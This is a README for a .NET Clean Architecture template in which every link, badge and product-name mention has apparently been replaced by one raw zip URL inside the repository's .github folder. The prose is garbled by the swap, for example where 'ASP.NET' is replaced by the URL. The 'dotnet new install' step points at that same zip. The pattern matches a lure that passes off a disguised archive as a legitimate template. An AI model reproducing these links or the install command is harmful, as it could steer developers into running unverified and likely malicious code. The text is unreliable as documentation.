# Clean Architecture Solution Template

[![Build](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
[![CodeQL](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
[![Nuget](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
[![Nuget](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
![Twitter Follow](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)

The goal of this template is to provide a straightforward and efficient approach to enterprise application development, leveraging the power of Clean Architecture and https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip Core. Using this template, you can effortlessly create a Single Page App (SPA) with https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip Core and Angular or React, while adhering to the principles of Clean Architecture. Getting started is easy - simply install the **.NET template** (see below for full details).

If you find this project useful, please give it a star. Thanks! ⭐

## Getting Started

The following prerequisites are required to build and run the solution:

- [.NET 8.0 SDK](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip) (latest version)
- [https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip) (latest LTS, only required if you are using Angular or React)

The easiest way to get started is to install the [.NET template](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip):
```
dotnet new install https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip
```

Once installed, create a new solution using the template. You can choose to use Angular, React, or create a Web API-only solution. Specify the client framework using the `-cf` or `--client-framework` option, and provide the output directory where your project will be created. Here are some examples:

To create a Single-Page Application (SPA) with Angular and https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip Core:
```bash
dotnet new ca-sln --client-framework Angular --output YourProjectName
```

To create a SPA with React and https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip Core:
```bash
dotnet new ca-sln -cf React -o YourProjectName
```

To create a https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip Core Web API-only solution:
```bash
dotnet new ca-sln -cf None -o YourProjectName
```

Launch the app:
```bash
cd src/Web
dotnet run
```

To learn more, run the following command:
```bash
dotnet new ca-sln --help
```

You can create use cases (commands or queries) by navigating to `./src/Application` and running `dotnet new ca-usecase`. Here are some examples:

To create a new command:
```bash
dotnet new ca-usecase --name CreateTodoList --feature-name TodoLists --usecase-type command --return-type int
```

To create a query:
```bash
dotnet new ca-usecase -n GetTodos -fn TodoLists -ut query -rt TodosVm
```

To learn more, run the following command:
```bash
dotnet new ca-usecase --help
```

## Database

The template is configured to use SQL Server by default. If you would prefer to use SQLite, create your solution using the following command:

```bash
dotnet new ca-sln --use-sqlite
```

When you run the application the database will be automatically created (if necessary) and the latest migrations will be applied.

Running database migrations is easy. Ensure you add the following flags to your command (values assume you are executing from repository root)

* `--project src/Infrastructure` (optional if in this folder)
* `--startup-project src/Web`
* `--output-dir Data/Migrations`

For example, to add a new migration from the root folder:

 `dotnet ef migrations add "SampleMigration" --project src\Infrastructure --startup-project src\Web --output-dir Data\Migrations`

## Deploy

The template includes a full CI/CD pipeline. The pipeline is responsible for building, testing, publishing and deploying the solution to Azure. If you would like to learn more, read the [deployment instructions](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip).

## Technologies

* [https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip Core 8](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
* [Entity Framework Core 8](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
* [Angular 15](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip) or [React 18](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
* [MediatR](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
* [AutoMapper](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
* [FluentValidation](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
* [NUnit](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip), [FluentAssertions](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip), [Moq](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip) & [Respawn](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)

## Versions
The main branch is now on .NET 8.0. The following previous versions are available:

* [7.0](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
* [6.0](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
* [5.0](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
* [3.1](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)

## Learn More

* [Clean Architecture with https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip Core 3.0 (GOTO 2019)](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
* [Clean Architecture with .NET Core: Getting Started](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)

## Support

If you are having problems, please let me know by [raising a new issue](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip).

## License

This project is licensed with the [MIT license](LICENSE).
